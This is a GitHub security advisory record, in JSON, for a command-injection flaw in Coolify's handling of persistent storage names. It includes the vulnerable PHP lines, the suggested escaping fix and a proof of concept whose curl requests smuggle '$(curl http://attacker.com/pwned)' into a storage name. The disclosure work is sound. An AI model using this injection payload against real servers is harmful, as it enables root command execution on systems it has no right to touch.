@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-mh8x-fppq-cp77",
+  "repo": {
+    "cve_id": "CVE-2026-34168",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\n\nThe `LocalPersistentVolume.name` field is interpolated directly into shell commands (`docker volume rm -f $storage->name`) without `escapeshellarg()`. An authenticated user can set a storage name containing shell metacharacters via the API, achieving command execution on managed servers when the resource is deleted.\n\nThis is the same class of bug as CVE-2025-66213 (which fixed `LocalFileVolume.fs_path`) but in a different model and code path that was not patched.\n\n## Root Cause\n\n**Sink (8+ files):**\n\n`app/Actions/Service/DeleteService.php:36`:\n```php\n$commands[] = \"docker volume rm -f $storage->name\";\n```\n\nSame pattern in `Application.php:393`, `ApplicationPreview.php:29,40`, `StandaloneRedis.php:143`, `StandaloneClickhouse.php`, `StandaloneMongodb.php`, `StandaloneMariadb.php`, `StandaloneDragonfly.php`.\n\n`instant_remote_process()` joins commands with newlines into a bash heredoc via SSH. No escaping.\n\n**Source (no validation):**\n\nAPI PATCH `app/Http/Controllers/Api/ApplicationsController.php` `update_storage()`:\n```php\n$validator = customApiValidator($request->all(), ['name' => 'string']);\n$storage->name = $request->name;\n$storage->save();\n```\n\nNo regex, no `escapeshellarg`, no `validateShellSafePath`. The API path sets the name directly without the UUID prefix that the Livewire path adds.\n\n## Proof of Concept\n\n```bash\n# 1. Create storage with malicious name via API\ncurl -X POST https://coolify/api/v1/applications/{uuid}/storages \\\n  -H \"Authorization: Bearer <token>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"test$(curl http://attacker.com/pwned)\", \"mount_path\": \"/data\", \"type\": \"persistent\"}'\n\n# 2. Delete the application (triggers docker volume rm)\ncurl -X DELETE https://coolify/api/v1/applications/{uuid} \\\n  -H \"Authorization: Bearer <token>\"\n\n# 3. Server executes: docker volume rm -f test$(curl http://attacker.com/pwned)\n#    The $(curl ...) runs as root on the managed server\n```\n\n## Inconsistency\n\nThe codebase uses `escapeshellarg()` in 15+ other locations. `LocalFileVolume` was patched with `escapeshellarg` after CVE-2025-66213. `LocalPersistentVolume.name` was not.\n\n## Suggested Fix\n\nWrap all `$storage->name` interpolations with `escapeshellarg()`:\n```php\n$commands[] = \"docker volume rm -f \" . escapeshellarg($storage->name);\n```\n\nOr add input validation on the name field:\n```php\n'name' => ['string', 'regex:/^[a-zA-Z0-9][a-zA-Z0-9._-]*$/'],\n```",
+    "ghsa_id": "GHSA-mh8x-fppq-cp77",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-mh8x-fppq-cp77",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-mh8x-fppq-cp77"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-34168"
+      }
+    ],
+    "published_at": "2026-07-02T16:37:00Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Command injection via unsanitized persistent storage name in docker volume commands",
+    "updated_at": "2026-07-02T16:37:00Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.471",
+        "vulnerable_version_range": "<= 4.0.0-beta.470"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
